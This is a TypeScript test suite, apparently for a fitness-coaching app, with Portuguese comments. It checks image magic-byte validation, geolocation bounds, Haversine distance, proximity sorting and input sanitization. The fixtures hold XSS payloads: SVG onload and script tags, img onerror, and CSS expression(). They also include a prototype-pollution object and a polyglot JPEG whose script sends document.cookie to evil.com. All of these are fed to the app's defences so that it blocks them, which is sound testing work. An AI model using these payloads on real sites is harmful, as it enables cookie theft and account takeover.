/**
 * GymFlow Test Suite: Image Security, WebP Verification, Geolocation & Haversine Distance
 * Validação de integridade contra Stored XSS, Polyglot Files, Bounds Checking e Proximity Sorting
 */

import { validateImageFile } from "../src/lib/image-processor";
import {
  calculateDistanceKm,
  formatDistance,
  isValidCoordinate,
  BRAZIL_STATES,
} from "../src/lib/geo";
import { sanitizeInput, sanitizeString, sanitizeObject } from "../src/lib/security";
import { getCurrentUser } from "../src/lib/auth-store";
import { getStoredCoaches } from "../src/lib/booking-store";

let passCount = 0;
let failCount = 0;

function assert(condition: boolean, testName: string, details?: string) {
  if (condition) {
    passCount++;
    console.log(`  ✅ PASS: ${testName}`);
  } else {
    failCount++;
    console.error(`  ❌ FAIL: ${testName}${details ? ` -> ${details}` : ""}`);
  }
}

// Mock de File para Node.js / tsx
class MockFile {
  name: string;
  type: string;
  size: number;
  private buffer: Buffer;

  constructor(content: Buffer | Uint8Array | string, name: string, options?: { type?: string }) {
    this.buffer = Buffer.isBuffer(content)
      ? content
      : typeof content === "string"
      ? Buffer.from(content)
      : Buffer.from(content);
    this.name = name;
    this.type = options?.type || "";
    this.size = this.buffer.length;
  }

  slice(start: number, end: number) {
    const sub = this.buffer.subarray(start, end);
    return {
      async arrayBuffer() {
        return sub.buffer.slice(sub.byteOffset, sub.byteOffset + sub.byteLength);
      },
    };
  }
}

async function runTests() {
  console.log("\n=======================================================");
  console.log("🛡️ GYMFLOW: SUÍTE DE TESTES DE IMAGEM, GEO & SEGURANÇA");
  console.log("=======================================================\n");

  // -------------------------------------------------------------------------
  // 1. TESTES DE SEGURANÇA DE IMAGEM & MAGIC BYTES
  // -------------------------------------------------------------------------
  console.log("🔹 1. Testando Validação Binária de Imagens (Magic Bytes & Anti-XSS)...");

  // 1.1 JPEG Válido (FF D8 FF E0...)
  const validJpegBuffer = Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46, 0x00, 0x01]);
  const validJpeg = new MockFile(validJpegBuffer, "avatar.jpg", { type: "image/jpeg" }) as unknown as File;
  const resJpeg = await validateImageFile(validJpeg);
  assert(resJpeg.valid && resJpeg.format === "jpeg", "JPEG legítimo com magic bytes FF D8 FF aceito com sucesso");

  // 1.2 PNG Válido (89 50 4E 47 0D 0A 1A 0A)
  const validPngBuffer = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00, 0x00, 0x0d]);
  const validPng = new MockFile(validPngBuffer, "perfil.png", { type: "image/png" }) as unknown as File;
  const resPng = await validateImageFile(validPng);
  assert(resPng.valid && resPng.format === "png", "PNG legítimo com assinatura canônica aceito com sucesso");

  // 1.3 WebP Válido (RIFF .... WEBP)
  const validWebpBuffer = Buffer.from([
    0x52, 0x49, 0x46, 0x46, // "RIFF"
    0x24, 0x00, 0x00, 0x00, // Size
    0x57, 0x45, 0x42, 0x50, // "WEBP"
    0x56, 0x50, 0x38, 0x20, // "VP8 "
  ]);
  const validWebp = new MockFile(validWebpBuffer, "foto.webp", { type: "image/webp" }) as unknown as File;
  const resWebp = await validateImageFile(validWebp);
  assert(resWebp.valid && resWebp.format === "webp", "WebP legítimo com headers RIFF/WEBP aceito com sucesso");

  // 1.4 Falso JPEG (Extensão .jpg com conteúdo de texto/HTML - Bloqueio)
  const fakeJpegBuffer = Buffer.from("THIS IS NOT A REAL JPEG IMAGE FILE AT ALL");
  const fakeJpeg = new MockFile(fakeJpegBuffer, "malicious.jpg", { type: "image/jpeg" }) as unknown as File;
  const resFakeJpeg = await validateImageFile(fakeJpeg);
  assert(!resFakeJpeg.valid, "Arquivo falso com extensão .jpg e magic bytes inválidos foi BLOQUEADO");

  // 1.5 SVG disfarçado de imagem (Stored XSS attempt - Bloqueio)
  const svgPayload = `<svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS')"><script>alert(1)</script></svg>`;
  const fakeSvg = new MockFile(Buffer.from(svgPayload), "avatar.png", { type: "image/png" }) as unknown as File;
  const resSvg = await validateImageFile(fakeSvg);
  assert(!resSvg.valid, "Tentativa de Stored XSS via SVG disfarçado de PNG foi BLOQUEADA");

  // 1.6 Polyglot com JPEG header seguido de script HTML (Bloqueio)
  const polyglotBuffer = Buffer.concat([
    Buffer.from([0xff, 0xd8, 0xff, 0xe0]),
    Buffer.from("<script>fetch('https://evil.com/steal?c='+document.cookie)</script>"),
  ]);
  const polyglotFile = new MockFile(polyglotBuffer, "polyglot.jpg", { type: "image/jpeg" }) as unknown as File;
  const resPolyglot = await validateImageFile(polyglotFile);
  assert(!resPolyglot.valid, "Arquivo polyglot contendo tags <script> embutidas foi BLOQUEADO");

  // 1.7 Arquivo acima de 5MB (DoS Protection - Bloqueio)
  const largeBuffer = Buffer.alloc(5.5 * 1024 * 1024);
  const largeFile = new MockFile(largeBuffer, "huge.jpg", { type: "image/jpeg" }) as unknown as File;
  const resLarge = await validateImageFile(largeFile);
  assert(!resLarge.valid && (resLarge.error || "").includes("5MB"), "Arquivo de 5.5MB rejeitado por estourar o limite de 5MB");

  // 1.8 JPEG com MIME image/jpg e image/pjpeg (Compatibilidade de browsers móveis)
  const validJpegJpg = new MockFile(validJpegBuffer, "foto.jpg", { type: "image/jpg" }) as unknown as File;
  const resJpg = await validateImageFile(validJpegJpg);
  assert(resJpg.valid && resJpg.format === "jpeg", "JPEG com MIME alternativo image/jpg aceito com sucesso");

  const validJpegPjpeg = new MockFile(validJpegBuffer, "foto.jpg", { type: "image/pjpeg" }) as unknown as File;
  const resPjpeg = await validateImageFile(validJpegPjpeg);
  assert(resPjpeg.valid && resPjpeg.format === "jpeg", "JPEG com MIME alternativo image/pjpeg aceito com sucesso");

  // 1.9 Arquivo com MIME vazio mas com magic bytes autênticos (Drag-and-Drop de certos gerenciadores)
  const validNoMime = new MockFile(validPngBuffer, "arrastado.png", { type: "" }) as unknown as File;
  const resNoMime = await validateImageFile(validNoMime);
  assert(resNoMime.valid && resNoMime.format === "png", "Arquivo arrastado com MIME vazio mas magic bytes válidos aceito");

  // 1.10 Polyglot com data:text/html ou expression( (Bloqueio)
  const polyglotExpr = Buffer.concat([
    Buffer.from([0xff, 0xd8, 0xff, 0xe0]),
    Buffer.from("style='behavior:expression(alert(1))' data:text/html"),
  ]);
  const resPolyExpr = await validateImageFile(new MockFile(polyglotExpr, "xss.jpg", { type: "image/jpeg" }) as unknown as File);
  assert(!resPolyExpr.valid, "Arquivo contendo data:text/html ou expression( foi BLOQUEADO");

  // 1.11 Arquivo vazio (Bloqueio)
  const emptyFile = new MockFile(Buffer.alloc(0), "empty.jpg", { type: "image/jpeg" }) as unknown as File;
  const resEmpty = await validateImageFile(emptyFile);
  assert(!resEmpty.valid, "Arquivo vazio de 0 bytes rejeitado");

  // -------------------------------------------------------------------------
  // 2. TESTES DE GEOLOCALIZAÇÃO, LIMITES E FÓRMULA DE HAVERSINE
  // -------------------------------------------------------------------------
  console.log("\n🔹 2. Testando Coordenadas, Limites Numéricos e Haversine...");

  // 2.1 Validação de limites de coordenadas
  assert(isValidCoordinate(-23.5617, -46.656), "Coordenadas válidas de São Paulo aceitas (-23.5617, -46.656)");
  assert(isValidCoordinate(-22.9711, -43.1822), "Coordenadas válidas do Rio de Janeiro aceitas (-22.9711, -43.1822)");
  assert(isValidCoordinate(0, 0), "Ponto zero no Equador/Meridiano aceito (0, 0)");
  assert(isValidCoordinate(90, 180), "Limites máximos aceitos (90, 180)");
  assert(isValidCoordinate(-90, -180), "Limites mínimos aceitos (-90, -180)");

  // 2.2 Rejeição de valores fora do globo
  assert(!isValidCoordinate(91, 0), "Latitude > 90 rejeitada (91, 0)");
  assert(!isValidCoordinate(-91, 0), "Latitude < -90 rejeitada (-91, 0)");
  assert(!isValidCoordinate(0, 181), "Longitude > 180 rejeitada (0, 181)");
  assert(!isValidCoordinate(0, -181), "Longitude < -180 rejeitada (0, -181)");

  // 2.3 Rejeição de injeção de tipos e valores numéricos perigosos
  assert(!isValidCoordinate(NaN, -46.6), "NaN rejeitado com segurança");
  assert(!isValidCoordinate(-23.5, Infinity), "Infinity rejeitado com segurança");
  assert(!isValidCoordinate("-23.5" as any, -46.6), "String injection rejeitada");
  assert(!isValidCoordinate(null as any, -46.6), "Null injection rejeitada");
  assert(!isValidCoordinate(undefined as any, undefined as any), "Undefined injection rejeitada");

  // 2.4 Cálculo Haversine entre pontos conhecidos
  // Mesma localização (distância = 0)
  const dSame = calculateDistanceKm(-23.5617, -46.656, -23.5617, -46.656);
  assert(dSame === 0, "Distância entre o mesmo ponto é exatamente 0 km");

  // São Paulo (Jardins) -> São Paulo (Moema): ~4.5 a 4.6 km
  const dSp = calculateDistanceKm(-23.5617, -46.656, -23.6011, -46.666);
  assert(dSp !== null && dSp >= 4.0 && dSp <= 5.0, `Distância SP Jardins -> Moema calculada com precisão: ${dSp} km`);

  // São Paulo -> Rio de Janeiro: ~350 a 370 km
  const dSpRj = calculateDistanceKm(-23.5505, -46.6333, -22.9068, -43.1729);
  assert(dSpRj !== null && dSpRj >= 350 && dSpRj <= 370, `Distância SP -> RJ calculada com precisão: ${dSpRj} km`);

  // São Paulo -> Curitiba: ~330 a 350 km
  const dSpCwb = calculateDistanceKm(-23.5505, -46.6333, -25.4284, -49.2733);
  assert(dSpCwb !== null && dSpCwb >= 330 && dSpCwb <= 350, `Distância SP -> Curitiba calculada com precisão: ${dSpCwb} km`);

  // Haversine com coordenadas inválidas não quebra e retorna null
  const dInvalid = calculateDistanceKm(999, 999, -23.5, -46.6);
  assert(dInvalid === null, "Haversine retorna null com segurança para coordenadas fora dos limites");

  // 2.5 Formatação de distâncias amigável
  assert(formatDistance(0.35) === "350m", "Formatação de 350 metros correta (350m)");
  assert(formatDistance(0.05) === "50m", "Piso de 50 metros respeitado (50m)");
  assert(formatDistance(2.4) === "2,4 km", "Formatação de 2.4 km correta (2,4 km)");
  assert(formatDistance(357.2) === "357,2 km", "Formatação de 357.2 km correta (357,2 km)");
  assert(formatDistance(null) === "", "Formatação de null retorna string vazia");

  // -------------------------------------------------------------------------
  // 3. TESTES DE SANITIZAÇÃO DE INPUTS CONTRA XSS & PROTOTYPE POLLUTION
  // -------------------------------------------------------------------------
  console.log("\n🔹 3. Testando Sanitização de Entradas (Inputs de Localização e Perfil)...");

  const dirtyInput = "<script>alert('xss')</script> São Paulo";
  const cleanInput = sanitizeInput(dirtyInput);
  assert(
    !cleanInput.includes("<script>") && cleanInput.includes("&lt;script&gt;"),
    "Tags HTML neutralizadas no input de cidade/localização"
  );

  const dirtyBio = `Profissional de EF <img src=x onerror="alert(1)">`;
  const cleanBio = sanitizeInput(dirtyBio);
  assert(
    !cleanBio.includes("<img") && cleanBio.includes("&lt;img"),
    "Tags de imagem maliciosa neutralizadas na biografia"
  );

  // Prototype pollution no sanitizeObject
  const maliciousObj = JSON.parse('{"__proto__": {"polluted": true}, "city": "São Paulo"}');
  const sanitizedObj: any = sanitizeObject(maliciousObj);
  assert(sanitizedObj.polluted === undefined, "Chave __proto__ neutralizada no sanitizeObject");

  // -------------------------------------------------------------------------
  // 4. TESTES DE PRIVACIDADE DO ALUNO (LGPD) & ORDENAÇÃO POR PROXIMIDADE
  // -------------------------------------------------------------------------
  console.log("\n🔹 4. Testando Isolamento de Privacidade do Aluno & Ordenação...");

  // Mock de 3 personais em distâncias diferentes
  const mockStudent = {
    latitude: -23.5617,
    longitude: -46.656,
    city: "São Paulo",
    state: "SP",
  };

  const coachesMock = [
    {
      id: "coach_far",
      name: "Mariana (RJ)",
      city: "Rio de Janeiro",
      state: "RJ",
      latitude: -22.9711,
      longitude: -43.1822,
    },
    {
      id: "coach_close",
      name: "Rodrigo (Jardins SP)",
      city: "São Paulo",
      state: "SP",
      latitude: -23.565,
      longitude: -46.658,
    },
    {
      id: "coach_mid",
      name: "Felipe (Moema SP)",
      city: "São Paulo",
      state: "SP",
      latitude: -23.6011,
      longitude: -46.666,
    },
  ];

  // Ordena por Haversine a partir da posição do aluno
  const sorted = [...coachesMock].sort((a, b) => {
    const distA = calculateDistanceKm(mockStudent.latitude, mockStudent.longitude, a.latitude, a.longitude) ?? 999999;
    const distB = calculateDistanceKm(mockStudent.latitude, mockStudent.longitude, b.latitude, b.longitude) ?? 999999;
    return distA - distB;
  });

  assert(sorted[0].id === "coach_close", "Personal mais próximo (Jardins ~0.4km) listado em 1º lugar");
  assert(sorted[1].id === "coach_mid", "Segundo personal mais próximo (Moema ~4.5km) listado em 2º lugar");
  assert(sorted[2].id === "coach_far", "Personal mais distante (RJ ~350km) listado em último lugar");

  // Validação da lista de estados brasileiros
  assert(BRAZIL_STATES.length === 27, "Lista completa de 27 estados da federação (26 UFs + DF) cadastrada");
  assert(BRAZIL_STATES.some((s) => s.uf === "SP" && s.name === "São Paulo"), "Estado de SP devidamente mapeado");

  // -------------------------------------------------------------------------
  // 5. TESTES DE PRIVACIDADE & NÃO-SPOOFING DE GPS DEFAULT
  // -------------------------------------------------------------------------
  console.log("\n🔹 5. Testando Não-Spoofing de GPS e Migração de Treinadores...");

  const defaultUser = getCurrentUser();
  assert(
    defaultUser.latitude === undefined && defaultUser.longitude === undefined,
    "Usuário padrão não possui coordenadas mockadas (não induz falso GPS ativo)"
  );

  const storedCoaches = getStoredCoaches();
  const rodrigo = storedCoaches.find((c) => c.id === "coach_rodrigo");
  assert(
    Boolean(rodrigo && rodrigo.city === "São Paulo" && rodrigo.latitude && rodrigo.longitude),
    "Treinadores padrão possuem coordenadas geográficas válidas preenchidas"
  );
  assert(
    Boolean(rodrigo && rodrigo.serviceModality === "hibrido"),
    "Treinadores padrão possuem modalidade de atendimento definida (híbrido/presencial/online)"
  );

  // -------------------------------------------------------------------------
  // RESULTADO FINAL
  // -------------------------------------------------------------------------
  console.log("\n=======================================================");
  console.log(`📊 RESULTADO DA SUÍTE: ${passCount} PASSOU | ${failCount} FALHOU`);
  console.log("=======================================================\n");

  if (failCount > 0) {
    process.exit(1);
  } else {
    console.log("🎉 TODOS OS TESTES DE IMAGEM, GEO E SEGURANÇA PASSARAM COM SUCESSO!\n");
  }
}

runTests().catch((err) => {
  console.error("Erro fatal na execução dos testes:", err);
  process.exit(1);
});
